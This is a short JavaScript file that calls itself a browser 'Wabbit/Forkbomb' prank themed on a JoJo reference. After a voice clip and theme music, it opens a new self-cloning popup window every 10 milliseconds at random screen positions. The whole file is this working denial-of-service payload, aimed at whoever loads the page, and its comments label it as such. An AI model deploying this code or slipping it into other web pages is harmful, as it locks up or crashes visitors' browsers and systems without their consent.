//Chrome experience requiem
//A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.

function createWabbit() { //Create a very similar clone window, with code to clone itself.
  var wabbit = window.open('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html','','width = 200,height = 200');
  wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
  wabbitsMade = wabbitsMade + 1;
}

setTimeout(function() {document.getElementById('theme').play(); setTimeout(function() {setInterval(createWabbit,10)}, 3000);}, 2750); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
